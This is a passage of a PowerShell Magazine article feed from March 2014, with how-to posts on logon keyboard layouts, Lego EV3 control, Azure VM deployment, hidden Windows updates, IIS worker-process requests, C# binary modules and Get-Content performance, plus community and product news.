Set-WinLogonLanguageList { [CmdletBinding(ConfirmImpact='High',SupportsShouldProcess=$true)] \u0026lt;# .SYNOPSIS Sets the keyboards visible on the logon screen .DESCRIPTION This function provides automated way to copy the keyboard settings of the current user to the Windows logon screen. It provides part of the functionality available in Region and Language Settings control panel. Region and Language Settings \u0026amp;gt; Administrative \u0026amp;gt; Copy settings... -\u0026gt; Copy to New Users and Welcome Screen \u0026gt; Welcome screen and system accounts Computer restart is needed after the change. .PARAMETER LanguageList Accepts list of user language objects. .PARAMETER Force Forces the change and computer restart without prompting for confirmation. .PARAMETER Restart Enables restarting the computer when the settings are updated. .EXAMPLE Get-WinUserLanguageList | Set-WinLogonKeyboardList -Force Sets the keyboard layouts of the current user to be available on the logon screen without asking for confirmation. #\u0026gt; param( [Parameter( Mandatory=$true, ValueFromPipeline=$true, ValueFromPipelineByPropertyName = $true )] [Microsoft.InternationalSettings.Commands.WinUserLanguage[]] $LanguageList, [Switch]$Force, [Switch]$Restart ) begin { $list = @() } process { foreach ($language in $LanguageList) { $list += $language } } end { if ($Force -or $PSCmdlet.ShouldProcess( \u0026quot;Windows logon screen\u0026quot;, \u0026quot;Set avalilable language(s) to: $($finalList.EnglishName -join ', ')\u0026quot; ) ) { $path = \u0026quot;Microsoft.PowerShell.Core\\Registry::HKEY_USERS\\.Default\\Keyboard Layout\\preload\u0026quot; #remove the current registry settings $current = (Get-Item $path).Property Remove-ItemProperty -Path $path -Name $current -Force #remove languages that are not installed on the system if ($list | where { -not $_.Autonym } ) { Write-Warning \u0026quot;The list you attempted to set contained invalid langauges which were ignored\u0026quot; $finalList = $list | where Autonym } else { $finalList = $list } $languageCode = $finalList.InputMethodTips -replace \u0026quot;.*:\u0026quot; for ($i = 0; $i -lt $languageCode.count; ++$i) { New-ItemProperty -Path $path -Name ($i+1) -Value $languageCode[$i] -PropertyType String -Force | Out-Null } if ($languageCode) { #restart only if changes were made if ($Restart -or $Force -or $PSCmdlet.ShouldProcess(\u0026quot;Computer\u0026quot;,\u0026quot;Restart computer to finish the process.\u0026quot;)) { Restart-Computer -Force } } } } }  The function requires Windows 8.1 (or Windows 8) and the elevated privileges to run successfully.\nAt this point one last catch reminded. During the post-deployment tasks the script is executed under the SYSTEM account. So getting the list of languages using the Get-WinUserLanguageList would only re-apply the settings that were already in place. I had to build the list myself and at first I used the following code:\n$list = New-WinUserLanguageList -Language cs-CZ $list.Add(\u0026quot;en-US\u0026quot;) Set-WinLogonLanguageList -LanguageList $list -Force But then I realized I was making it more complicated than it had to be and used just:\nSet-WinLogonLanguageList -LanguageList cs-CZ, en-US -Force ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2014/03/24/set-keyboard-layouts-available-on-logon-screen-in-windows-8-1/","tags":["How To"],"title":"Set keyboard layouts available on logon screen in Windows 8.1"},{"categories":["Demo"],"contents":"One of PowerShell Magazine’s editors is asking me for quite some time to write an article about how to move Lego “bricks” from PowerShell. This demo is part of PowerShell Demo Extravaganza session that I’ve presented at different Microsoft conferences (TechEd Australia 2013 session is recorded here). This will be the first part in PowerShell demo extravaganza series of posts, so let’s start.\nTo move Lego from command line you need one special Lego “brick”. It comes with only few sets (8547 or 31313), and it’s called “intelligent brick”. This is the newest model (version 3).\nIn the past I used previous model to move different sets (like Crane and R2D2 (at 1:14)). To move them I used .Net library from MindSqualls site. Last week I finally received new set but when I tried to use the same approach it didn’t work. Luckily, a new .NET library was published last year on CodePlex (LEGO MINDSTORMS EV3 API). Great things about this new .NET library is that it comes with documentation too.\nFirst, we need to download .NET library, and expand files (don’t forget to unblock the archive before unpacking). It comes with three flavors:\n Desktop Phone WinRT  We will concentrate on the Desktop version. The steps are similar for other two platforms.\nStep 1. Load DLL into your PowerShell session [Reflection.Assembly]::LoadFile('C:\\Lego.Ev3.1.0.0\\Lego.Ev3.Desktop.dll')  Step 2. Create a “brick” object Before we continue, we need to connect “brick” and a laptop. The following connection types are available:\n USB Bluetooth WiFi (it requires USB WiFi adapter to be inserted into “brick” )  In this example we will use Bluetooth. Please ensure that Bluetooth is enabled on “brick” and iPhone/iPad/iPod is not selected, and then pair it with a computer and note outbound COM port.\n$btc = New-Object -TypeName Lego.Ev3.Desktop.BluetoothCommunication COM3 $brick = New-Object -TypeName Lego.Ev3.Core.Brick $btc  Step 3. Connect a laptop and a “brick” $brick.ConnectAsync()  And that’s it–the connection is established with just three commands. Now we have full control of our Lego Mindstorms robot!\nWe can connect motors and sensors to the “brick”. Motors are connected to ports named with letters (“A”, “B”, “C”, “D”) and sensors that are named with numbers (“1”, “2”, “3”, “4”). Brick object that we have created have the “Ports” property. It allows us to get information about what is connected to each port.\nDisplay motor connected on port “B”\n$brick.Ports[\"B\"]  Note: When motor is connected to a port, *Value properties are number of steps (full circle is 360 steps) that motor has done.\nDisplay sensor connected on port “3”:\n$brick.Ports[\"3\"]  Note: In case of infrared sensor *Value properties represent a distance between sensor and nearest obstacle. To move the “brick” we need first to assemble an EV3 robot that has some motors. For start we will use the TRACK3R. It has three motors and one IR sensor that we can use to measure distance.\nTo move motors we can use different methods “under” $brick.DirectCommand property:\n$brick.DirectCommand.StepMotorAtPowerAsync(@(\"B\",\"C\"), 50, 360, $false)   @(“B”,”C”)- turn on two motors 50 – represtens Power (1 – 100) 360 – number of steps $false – engage (parking) brake after command is completed  This is the complete code to move motors for one full circle:\n[Reflection.Assembly]::LoadFile('C:\\Lego.Ev3.1.0.0\\Lego.Ev3.Desktop.dll') $btc = New-Object -TypeName Lego.Ev3.Desktop.BluetoothCommunication COM3 $brick = New-Object -TypeName Lego.Ev3.Core.Brick $btc $brick.ConnectAsync() $brick.DirectCommand.StepMotorAtSpeedAsync(@(\u0026quot;B\u0026quot;,\u0026quot;C\u0026quot;), 50, 360, $false) How hard is to move Lego “Brick” using PowerShell? Well, just four lines of code! I really like PowerShell!\nIn the next post we will take care that this robot avoids obstacles. Stay tuned!\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2014/03/21/powershell-demo-extravaganza-lego-mindstorms-robot-part-1/","tags":["Demo"],"title":"PowerShell Demo Extravaganza: Lego Mindstorms Robot, Part 1"},{"categories":["PowerShell DSC"],"contents":"Desired State Configuration is the hottest thing out there and everyone is writing custom DSC resources for almost everything. One of the most important aspects of writing custom DSC resources is to write help content on how to use these custom resources. All of us know that custom DSC resources are nothing but PowerShell modules. But, these modules contain a similar set of functions. These functions are Get-TargetResource, Set-TargetResource, and Test-TargetResource. So, writing comment-based help for these functions does not really make sense. More over, these functions are the back end mechanism for performing configuration changes. The real help that is required for a custom DSC resource should be about how to use the declarative syntax of the resource.\nThe way this can be solved is by using conceptual help topics or the about topic text files. The about help topics are one of the different methods of writing module help in PowerShell.\nLet’s look at an example. One of the DSC resources I’d written was the HostsFile resource. I had written the about topic for this module and here is the folder structure for this DSC resource.\nIf you look at the folder structure and file names, you will see that I have localized the help content. For example, I have written only the English help content. So, I’d created a folder named en-US which is the UI culture on my system. Under this folder, I placed the help content for the HostsFile resource as an about text file and named it about_DSCResource_hostsfile.help.txt_. Make a note of the naming convention used. It is mandatory that the file name must end with .help.txt. I recommend that you use the naming convention that makes it easy to identify the DSC resource help content. For example, I am using _about_DSCResource_.help.txt_. Also, remember that the file must be saved using _UTF-8_ encoding.\nOnce you have the above criteria met, you can simply look at the about help content using the command Get-Help about*_.\nHere is the partial content of my about_ text file for HostsFile DSC resource.\nBy following this approach, you should be able to add help content on how to use your custom DSC resources.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2014/03/21/writing-help-for-custom-dsc-resources/","tags":["PowerShell DSC"],"title":"Writing help for custom DSC resources"},{"categories":["How To","Azure","Kemp"],"contents":"VM Depot is a community-driven catalog of open source virtual machine images. Azure management portal can be used to copy these VM images into “My images” of your Azure subscription. Once we have the community image in “My images”, we can create a VM from that. This is a multi-step process. There is no PowerShell equivalent of doing this. We can, however, use Azure CLI to achieve this in a single command. I will show you how this can be done using PowerShell. For this example, I will deploy Kemp’s Virtual LoadMaster from VM Depot.\nBefore we go to the PowerShell method, let us look at how this is done using Azure CLI. The deployment script for the Azure CLI can be obtained from the VM Depot portal.\nI wanted to understand how Azure CLI can achieve what is not available in Azure PowerShell. So, from what I found, these are the steps involved.\n Get the VM image name. In this example, “vmdepot-23920-1-1” is the VM image name. Retrieve the VHD using the VM image name. Azure CLI uses the OData service provided by VM Depot. Copy the VHD blob from community images container obtained in step 2 to your storage account. Create a VM image from the copied VHD blob. Create a new VM from the image created in step 4.  We seriously need PowerShell here! 🙂\nStep 1 is already known. We can just grab the VM image name from the deployment script given by VM Depot. Let us go to step 2.\nRetrieve VHD blob path from VM image name For this part, I reverse engineered what Azure CLI was doing. This is when I came to know that VM Depot has a OData service. We need to use the ResolveUid endpoint and pass the VM image name as the uid.\n(Invoke-RestMethod -Uri 'http://vmdepot.msopentech.com/OData.svc/ResolveUid?uid=%27vmdepot-23920-1-1%27').ResolveUid.Element.BlobUrl  Copying the VM VHD blob to Azure storage account This is easy. We can use the Azure cmdlets to achieve this. You need a storage account, access key, and an existing container. You can look at the Azure management portal for this information. The following code snippet helps you copy the VHD blob to your storage account.\n$BlobUri = \u0026quot;http://vmdepoteastus.blob.core.windows.net/linux-community-store/community-34189-c64af7cb-cfec-4c4f-b893-99fd4debdf3a-1.vhd\u0026quot; Select-AzureSubscription \u0026quot;your-subscription-name\u0026quot; $StorageAccount = \u0026quot;your-storageaccount-name\u0026quot; $StorageKey = \u0026quot;your-storageaccount-key\u0026quot; $DestinationContext = New-AzureStorageContext –StorageAccountName $StorageAccount -StorageAccountKey $StorageKey $ContainerName = \u0026quot;your-container-name\u0026quot; $StorageBlob = Start-AzureStorageBlobCopy -SrcUri $BlobUri -DestContainer $ContainerName -DestBlob \u0026quot;kemp1.vhd\u0026quot; -DestContext $DestinationContext $CopyStatus = $StorageBlob | Get-AzureStorageBlobCopyState While ($CopyStatus.Status -eq 'Pending') { $CopyStatus = ($StorageBlob | Get-AzureStorageBlobCopyState) Write-Progress -Id 1 -Activity \u0026quot;Copying VHD BLOB to Azure Storage\u0026quot; -Status (\u0026quot;{0} bytes of {1} completed\u0026quot; -f $CopyStatus.BytesCopied, $CopyStatus.TotalBytes) Start-Sleep -Seconds 5 } \u0026quot;Blob copy completed with status: $($copyStatus.Status)\u0026quot; Once the copy process completes successfully, you can see the VHD added to the container in your storage account.\nCreating VM image from the VHD\nOnce again, this is a simple task with the help of Azure PowerShell cmdlets. We need the location of the VHD we copied in the previous step. We can use the storage context created earlier to create this Uri.\n$ImageLocation = \"$($DestinationContext.BlobEndPoint)$($ContainerName)/kemp1.vhd\"  We can use the Add-AzureVMImage cmdlet to add this VHD as a VM image.\nAdd-AzureVMImage -ImageName \"Kemp\" -MediaLocation $ImageLocation -OS Linux -Verbose  This usually takes a little while to show up in images. You can use the Get-AzureVMImage cmdlet to verify this.\nGet-AzureVMImage -ImageName \"Kemp\"  Create a new VM from the image We can use the New-AzureVM cmdlet to deploy the Kemp VLM.\n$KempImage = Get-AzureVMImage -ImageName Kemp $KempVLM = New-AzureVMConfig -Name \"Kemp-VLM-1\" -InstanceSize Small -ImageName $KempImage.ImageName | Add-AzureProvisioningConfig -Linux -LinuxUser \"Ravikanth\" -Password \"Pass@w0Rd\" -NoSSHEndPoint -Verbose New-AzureVM -ServiceName \"ravikemp\" -VMs $KempVLM -WaitForBoot  This is it. A virtual machine has been deployed using a VM Depot image. You can use this procedure to deploy any VM Depot image.\nWhile we are talking about Kemp VLM, let us see how we can complete the process of configuring Kemp VLM. We need to create the endpoints for accessing the VLM locally and externally.\nThe Add-AzureEndpoint cmdlet can be used to add the endpoints to the Azure VM.\nGet-AzureVM -ServiceName \"RaviKemp\" -Name \"Kemp-VLM-1\" | Add-AzureEndpoint -Name \"Port22\" -Protocol TCP -LocalPort 22 -PublicPort 22 -Verbose | Add-AzureEndpoint -Name \"Port8443\" -Protocol TCP -LocalPort 8443 -PublicPort 8443 -Verbose | Update-AzureVM -Verbose  Once we have the endpoints created, we can access the Kemp Web User Interface to license the VLM. You will require a Kemp ID to complete the licensing process. Start-Process \"https://VMPublicVIPAddress:8443/\"  In the upcoming posts, we will see using Kemp PowerShell module to manage a Kemp VLM. ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2014/03/20/deploying-azure-virtual-machines-from-vm-depot-using-powershell/","tags":["Azure","Kemp","How To"],"title":"Deploying Azure Virtual Machines from VM Depot using PowerShell"},{"categories":["How To"],"contents":"When you visit Windows Update, you can hide an update to avoid being prompted to install it again at next scan. If you’veever hidden an update, you’vealso the ability to restore hidden updates in the Windows Update control panel applet by clicking the “restore hidden updates” button. However, over time, you’ll forget what update(s) you’ve hidden. There’s no built-in way to show hidden updates.\nLet’s see how PowerShell can help in this situation and define 2 functions and a filter to view already hidden updates.\nFunction Get-WindowsUpdate { [Cmdletbinding()] Param() Process { try { Write-Verbose \u0026quot;Getting Windows Update\u0026quot; $Session = New-Object -ComObject Microsoft.Update.Session $Searcher = $Session.CreateUpdateSearcher() $Criteria = \u0026quot;IsInstalled=0 and DeploymentAction='Installation' or IsPresent=1 and DeploymentAction='Uninstallation' or IsInstalled=1 and DeploymentAction='Installation' and RebootRequired=1 or IsInstalled=0 and DeploymentAction='Uninstallation' and RebootRequired=1\u0026quot; $SearchResult = $Searcher.Search($Criteria) $SearchResult.Updates } catch { Write-Warning -Message \u0026quot;Failed to query Windows Update because $($_.Exception.Message)\u0026quot; } } } Function Show-WindowsUpdate { Get-WindowsUpdate | Select Title,isHidden, @{l='Size (MB)';e={'{0:N2}' -f ($_.MaxDownloadSize/1MB)}}, @{l='Published';e={$_.LastDeploymentChangeTime}} | Sort -Property Published }  Now to show all hidden updates, you only need to do the following:\nShow-WindowsUpdate | Where { $_.isHidden }| Out-GridView  To be able to restore all hidden updates, an additional advanced function is required.\nFunction Set-WindowsHiddenUpdate { [Cmdletbinding()] Param( [Parameter(ValueFromPipeline=$true,Mandatory=$true)] [System.__ComObject[]]$Update, [Parameter(Mandatory=$true)] [boolean]$Hide ) Process { $Update | ForEach-Object -Process { if (($_.pstypenames)[0] -eq 'System.__ComObject#{c1c2f21a-d2f4-4902-b5c6-8a081c19a890}') { try { $_.isHidden = $Hide Write-Verbose -Message \u0026quot;Dealing with update $($_.Title)\u0026quot; } catch { Write-Warning -Message \u0026quot;Failed to perform action because $($_.Exception.Message)\u0026quot; } } else { Write-Warning -Message \u0026quot;Ignoring object submitted\u0026quot; } } } }  Let’s first hide four random updates:\nGet-WindowsUpdate | Get-Random -Count 4 | Set-WindowsHiddenUpdate -Hide $true -Verbose  To restore all hidden updates, we can simply do:\nGet-WindowsUpdate| Set-WindowsHiddenUpdate -Hide $false -Verbose  But if we want to restore only some of them, that’s also possible:\nGet-WindowsUpdate | Where { $_.isHidden } | Out-GridView -PassThru | Set-WindowsHiddenUpdate -Hide $false -Verbose  In Europe, Windows Update proposes an update called on my Windows 8.1 the Microsoft Browser Choice Screen Update for EEA Users of Windows 8.1 for x64-based Systems (KB976002)\nThe problem with this update is that it’s marked as a permanent component and thus cannot be uninstalled.\nWith the above functions, we are now able to hide this update like this:\nGet-WindowsUpdate | Where { $_.Title -match 'Microsoft Browser Choice Screen Update'} | Set-WindowsHiddenUpdate -Hide $true -Verbose  ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2014/03/19/how-to-view-and-restore-hidden-windows-updates-with-powershell/","tags":["How To"],"title":"How to view and restore hidden Windows Updates with PowerShell"},{"categories":["Community"],"contents":"After Fredrik and Jan, I had to write this. I founded the PowerShell Bangalore User Group (PSBUG) which is the first PowerShell User Group in India. I have a story to tell you.\nMy story started way back in 2008. Towards end of year 2008, I joined the Bangalore IT Pro user group which was already an established technical community in Bangalore. In fact, BITPro is the largest IT Pro community in India with more than 5000 members. Soon I got involved in managing the group and spoke at various events.\nThe topics that we covered at Bangalore IT Pro were quite diverse. We spoke not only about Microsoft technologies but others such as VMware and BlackBerry too. And, this list included PowerShell too. But, it was not getting the level of focus it should. This is when I thought Bangalore needs a dedicated PowerShell user group. So, after a lot of procrastination, I announced the inaugural meet on 28th July 2012! The first PowerShell User Group in India was born! By then, I was a two year MVP award recipient in Windows PowerShell and people identified me for that.\nFor the first few meetings I was the only one speaking at the PSBUG events. But, not for long.\nThe PSBUG community grew faster than we expected and today we have several well known speakers. To name a few, Deepak Dhami, Sahal Omer, Vinith Menon, Hemanth Chowdary, Harshul Patel, Pradeep Rawat, Manoj Nair, and Kamlesh Rao. Everyone here is an expert in their own domain and not just PowerShell. So, we have a varied type of discussions at our UG meetings.\nLooking back at what we have done in last few years, we have had very successful user group meetings–online and in-person–and helped several people get started with PowerShell. I hear people saying after the UG meetings that they always learn something very helpful for their career. We have hosted the first PowerShell Saturday in India. This was a very successful and well-received event. We are scheduling a few online sessions starting next month.\nOh! Btw, I love our group’s logo! 🙂\nIf you are around Bangalore area in India (actually, it doesn\u0026rsquo;t matter), join us today. Join us in sharing the PowerShell knowledge.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2014/03/19/the-story-of-powershell-bangalore-user-group-psbug/","tags":["Community"],"title":"The story of PowerShell Bangalore User Group (PSBUG)"},{"categories":["Tips and Tricks","WMI"],"contents":"Note: This tip requires PowerShell 2.0 or above.\nIIS lets you view all worker processes of a server when you double click the Worker Process tile in IIS manager (inetmgr.exe).\nIf you double click a process you will get the requests that are currently running inside that worker process. The information gives you a good view of the current requests but this is only good for the server you’re currently working. Using PowerShell you can get the information from multiple servers and view all requests in one view.\nUsing WMI we can get the worker processes of a server by getting the instances of the WorkerProcess class.\nPS\u0026gt; Get-WmiObject WorkerProcess -Namespace root\\WebAdministration -ComputerName IIS1 __GENUS : 2 __CLASS : WorkerProcess __SUPERCLASS : Object __DYNASTY : Object __RELPATH : WorkerProcess.ProcessId=4252 __PROPERTY_COUNT : 3 __DERIVATION : {Object} __SERVER : IIS1 __NAMESPACE : root\\WebAdministration __PATH : \\\\IIS1\\root\\WebAdministration:WorkerProcess.ProcessId=4252 AppPoolName : SharePoint - mysite Guid : 0fb641ca-b913-4628-99ff-6ffd13ee4b52 ProcessId : 4252 PSComputerName : IIS1 __GENUS : 2 __CLASS : WorkerProcess __SUPERCLASS : Object __DYNASTY : Object __RELPATH : WorkerProcess.ProcessId=8512 __PROPERTY_COUNT : 3 __DERIVATION : {Object} __SERVER : IIS1 __NAMESPACE : root\\WebAdministration __PATH : \\\\IIS1\\root\\WebAdministration:WorkerProcess.ProcessId=8512 AppPoolName : DefaultAppPool Guid : 0237506e-4924-45a8-b334-284202d83d8d ProcessId : 8512 PSComputerName : IIS1 If you pipe the result to the Get-Member cmdlet you will find a method called GetExecutingRequests.\nPS\u0026gt; Get-WmiObject WorkerProcess -Namespace root\\WebAdministration -ComputerName IIS1 TypeName: System.Management.ManagementObject#root\\WebAdministration\\WorkerProcess Name MemberType Definition ---- ---------- ---------- PSComputerName AliasProperty PSComputerName = __SERVER GetExecutingRequests Method System.Management.ManagementBaseObject GetExecutingRequests() GetState Method System.Management.ManagementBaseObject GetState() AppPoolName Property string AppPoolName {get;set;} Guid Property string Guid {get;set;} (...) The GetExecutingRequests method lets you see the requests that were executing at the time that the method was run. Requests execute fast so you might get empty results when you execute the method. To restrict the result to a specific pool name, use the -Filter parameter.\nGet-WmiObject WorkerProcess -Namespace root\\WebAdministration -ComputerName IIS1 -Filter \u0026quot;AppPoolName='SharePoint - mysite'\u0026quot; | Invoke-WmiMethod -Name GetExecutingRequests __GENUS : 2 __CLASS : __PARAMETERS __SUPERCLASS : __DYNASTY : __PARAMETERS __RELPATH : __PROPERTY_COUNT : 1 __DERIVATION : {} __SERVER : __NAMESPACE : __PATH : OutputElement : {} PSComputerName : __GENUS : 2 __CLASS : __PARAMETERS __SUPERCLASS : __DYNASTY : __PARAMETERS __RELPATH : __PROPERTY_COUNT : 1 __DERIVATION : {} __SERVER : __NAMESPACE : __PATH : OutputElement : {mysite, mysite, mysite} PSComputerName : The resultant objects you want to take a look at are the ones that have a value in the OutputElement property. The following is the result of the above highlighted OutputElement property:\n__GENUS : 2 __CLASS : HttpRequest __SUPERCLASS : Object __DYNASTY : Object __RELPATH : __PROPERTY_COUNT : 14 __DERIVATION : {Object} __SERVER : __NAMESPACE : __PATH : ClientIPAddress : 10.10.10.10 ConnectionId : cf0000006001800f CurrentModule : ManagedPipelineHandler GUID : HostName : mysite LocalIPAddress : 11.11.11.11 LocalPort : 80 PipelineState : 128 SiteId : 1202063871 TimeElapsed : 1544 TimeInModule : 1529 TimeInState : 1529 Url : /Pages/Default.aspx Verb : GET PSComputerName : (...) Using the following snippet you can create a custom object that captures the server name, application pool name and ID, and all relevant properties of the OutputElement object.\n$wp = Get-WmiObject WorkerProcess -Namespace root\\WebAdministration -ComputerName IIS1,IIS2,IIS3 foreach($w in $wp) { $w | Invoke-WmiMethod -Name GetExecutingRequests | Select-Object -ExpandProperty OutputElement | Foreach-Object{ [PSCustomObject]@{ AppPoolName = $w.AppPoolName ProcessId = $w.ProcessId ClientIPAddress = $_.ClientIPAddress CurrentModule = $_.CurrentModule HostName = $_.HostName LocalIPAddress = $_.LocalIPAddress LocalPort = $_.LocalPort SiteId = $_.SiteId Url = $_.Url Verb = $_.Verb PSComputerName = $w.__SERVER } } } AppPoolName : SharePoint - mysite ProcessId : 5080 ClientIPAddress : 10.10.10.10 CurrentModule : IIS Web Core HostName : mysite LocalIPAddress : 11.11.11.11 LocalPort : 80 SiteId : 1202063871 Url : /Pages/_layouts/IMAGES/MasterPages/Dropdown.png Verb : GET PSComputerName : IIS1 ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2014/03/18/pstip-get-requests-that-are-currently-executing-in-a-worker-process/","tags":["Tips and Tricks","WMI"],"title":"#PSTip Get requests that are currently executing in a worker process"},{"categories":["How To"],"contents":"In this series we will cover the basics of building a Windows PowerShell binary module using C#. In the first part of the series we will build a module with just one cmdlet called Get-Salutation that will resemble the traditional “Hello World” example.\nWe will use Visual Studio 2013 since it includes the reference assemblies for System.Management.Automation \u0026ndash; the root namespace for Windows PowerShell–for Microsoft .Net Framework 4.0. Microsoft has not released a PowerShell 4.0 SDK with reference assemblies using Microsoft .NET Framework 4.5 at this moment. If you are planning to support Windows PowerShell 2.0 then you will need to download the Windows PowerShell 2.0 SDK from Microsoft http://www.microsoft.com/en-us/download/details.aspx?id=2560. Visual Studio 2013 Express for Windows Desktop version can also be used.\nOpen Visual Studio and create a new project from the File menu:\nSelect the Visual C# from the installed Templates list and then pick Class Library since compiled modules in PowerShell are in DLL format:\nWe give it a name and specify a location for our project. For the purpose of this tutorial I will name my project MyModule.\nNext step is to set the project’s minimum target .NET Framework depending on the lowest version of PowerShell we want to support. You can use as a reference:\n PowerShell 2.0 – .NET Framework 3.5 PowerShell 3.0 – .NET Framework 4 PowerShell 4.0 – .NET Framework 4.5  Now, on the Application tab we select the target framework from the dropdown list.\nFor this example project we use a PowerShell 3.0 assembly and we want to support that as the lowest version of PowerShell. That’s why we select .NET Framework 4. We will be asked to confirm the change and it will re-open the project.\nWe need to load the System.Management.Automation library as a reference to our project to make the PowerShell API calls available. To do this we right click on Reference in the Solution Explorer and select Add Reference\nIn the Reference Module Manager click on Browse:\nNow navigate to C:\\Program Files (x86)\\Reference Assemblies\\Microsoft\\WindowsPowerShell\\3.0 This folder is created with the installation of Visual Studio 2013. There we select the System.Management.Automation.dll to add it to our references.\nOnce we have the reference assembly in our project we can now use the assembly to get access to the API calls we need to build a PowerShell module. We start by adding System.Management.Automation to the default list that Class template has provided.\nThose familiar with PowerShell advanced functions will notice that process for creating a cmdlet in C# is very similar. The major difference is that a module with advanced functions is stored in a .psm1 file and cmdlets are stored in a DLL file. The attributes are used even in the same manner so for a person that has written script modules in PowerShell going to C# is very easy.\nLet’s start by applying the attribute to the default class created in our namespace. You will see that in the case of C# we have to define the verb and the noun for the cmdlet. Thankfully, Visual Studio supports the IntelliSense for the verb group and the verbs inside the group.\nAfter selecting a verb, we need to add the second parameter to the attribute–the noun we want to use (in our case a noun is Salutation). The verb and noun combination we use in the attribute is how the cmdlet will be named in PowerShell. The class name has no impact. As you can see it the following screenshot, if we place a comma after the second parameter, IntelliSense will suggest other named parameters we can use when defining the cmdlet.\nOne thing we have to make sure of is that the class inherits from the PSCmdlet class. This is done by adding : PSCmdlet at the end of the class name.\nI like naming my classes  in Pascal case following Microsoft naming guidelines http://msdn.microsoft.com/en-us/library/4xhs4564(v=vs.71).aspx to easily identify them when working inside of Microsoft Visual Studio.\nIn PowerShell, the parameters of an advanced function become the named parameters of the command, in the case of a class that defines a cmdlet it is a public class properties that become the named parameters of the command. In the case of our Get-Salutation cmdlet we would like to be able to provide a single name or array of names we would like to get a salutation for. Also, we would like our Name parameter to have the following characteristics:\n The parameter has to be mandatory. To accept pipeline input by property name. Use aliases for common property names that can be used to reference a person’s name in an object. Provide a Help Message to describe it when looking at help or being asked to provide a value.  The syntax is almost identical to PowerShell. We apply the attributes to the public property and its name becomes the name of the parameter. For more information on using properties check http://msdn.microsoft.com/en-us/library/w86s7x04.aspx\nA PowerShell function can have the following named script blocks:\n Begin – This block is used to provide optional one-time pre-processing. In the case of multiple values provided through the pipeline this block only executes once. Process – This block executes each time the command is called. In the case of multiple values provided through the pipeline this block executes for each one of those values. End – This block is used to provide optional one-time post-processing.  When we write a cmdlet in C# we accomplish the same using the following methods:\n BeginProcessing() – Provides a one-time, preprocessing functionality for the cmdlet. ProcessRecord() – Provides a record-by-record processing functionality for the cmdlet. EndProcessing() – Provides a one-time, post-processing functionality for the cmdlet.  Each of the methods is inherited from the PSCmdlet class so we need to use the protected and override modifiers.\nThe list of all supported methods is available at http://msdn.microsoft.com/en-us/library/system.management.automation.cmdlet_methods(v=vs.85).aspx . Since we are building a super simple module just to show the basic concepts we only need the ProcessRecord() method (we won’t need to initialize any data or finalize any action or actions at the end of execution). Also, we’ll use the WriteVerbose() method to write verbose information if requested. In an advanced function this would be the equivalent of using the Write-Verbose __cmdlet. Next, a string object is created and returned to pipeline using the WriteObject() method. This is equivalent to placing a variable containing an object or collection of objects on its own in the body of an advanced function so it would be send down the pipeline.\nNow we just need to build the solution by pressing F7 or selecting Build Solution from the BUILD menu. In the Output pane of Visual Studio we should see that it builds successfully and provides us a path to the generated DLL.\nTo test the module we open a PowerShell session, navigate to where the DLL is and use the Import-Module cmdlet with the -Verbose parameter to see if it loads our cmdlet.\nIf we use the Get-Help cmdlet against Get-Salutation we should see the Name parameter and the proper information for it.\nLet’s test the cmdlet directly and from the pipeline to make sure it works like it should. First, we test giving it several values to the parameter, then a collection of strings from the pipeline and at the end, an object with property that matches one of the aliases.\nIn the next part we will look at setting up debugging for the module inside of Visual Studio 2013.\nIf you are interested in more advanced examples for PowerShell 3.0 and 4.0 take a look at the sample pack in MSDN http://code.msdn.microsoft.com/Windows-PowerShell-30-SDK-9a34641d\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2014/03/18/writing-a-powershell-module-in-c-part-1-the-basics/","tags":["Modules","PSCmdlet","How To"],"title":"Writing a PowerShell module in C#, Part 1: The basics"},{"categories":["News","Kemp"],"contents":"In an earlier article, I talked about managing Kemp LoadMaster appliances (both physical and virtual) using the Kemp’s RESTful API. Using RESTful API is complex because you need to know all the details of how API is implemented and what are different features available to you. Even if you figure out how to use RESTful APIs, any changes to the product or RESTful API might break your scripts.\nThe folks at Kemp Technologies understood this and started working on a PowerShell module for managing Kemp LoadMaster appliances. A beta version of this module is available for download. Note that you need to register to see the PowerShell module download. Using this module, you can manage both physical and virtual LoadMaster appliances.\nThe module is named Kemp.LoadBalancer.Powershell and there are 92 cmdlets in the beta version.\nThis module comes with built-in help content. So, you can use your PowerShell-Fu to explore the cmdlets, see examples, and so on.\nI will be writing more about this module and how you can use it to automate the management of Kemp LoadMaster appliances in the upcoming posts. If you want a Kemp VLM to experiment with this module, go ahead and download the trial. You get a 30-day license.\nYou can leave your feedback or ask questions in Kemp’s product forum and the team will be more than happy to help you.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2014/03/18/announcing-powershell-module-for-managing-kemp-loadmaster-appliances/","tags":["Kemp","News"],"title":"Announcing PowerShell module for managing Kemp LoadMaster appliances"},{"categories":["Tips and Tricks"],"contents":"Note: This tip requires PowerShell 2.0 or above.\nA few days ago I had to write a script to upload files to a remote FTP server. I needed to read the file (0.7 mb) and store it as a byte array. My first attempt to do this was to use the Get-Content cmdlet.\nGet-Content c:\\test.log -Encoding Byte  It works great but there’s only one downside to it–it is painfully slow–and I quickly resorted to an alternative method using a .NET class:\n[System.IO.File]::ReadAllBytes('c:\\test.log')  ReadAllBytes() worked incredibly fast in compare to the cmdlet. I measured how much it took for each command to finish. Get-Content took 18.308045 seconds to complete while ReadAllBytes() took only 0.2811065!\nI had a time limit to finish the script so I left it with the .NET method and decided to check later what can be done to make Get-Content perform faster. Later on I came back to it and checked the help of Get-Content. The answer was found in the ReadCount parameter. The default behavior is sending one line at a time, in my case it was one byte at a time.\nPS\u0026gt; Get-Help Get-Content -Parameter ReadCount -ReadCount Specifies how many lines of content are sent through the pipeline at a time. The default value is 1. A value of 0 (zero) sends all of the content at one time. This parameter does not change the content displayed, but it does affect the time it takes to display the content. As the value of ReadCount increases, the time it takes to return the first line increases, but the total time for the operation decreases. This can make a perceptible difference in very large items. Required? false Position? named Default value 1 Accept pipeline input? true (ByPropertyName) Accept wildcard characters? false  I changed it to 0 so all 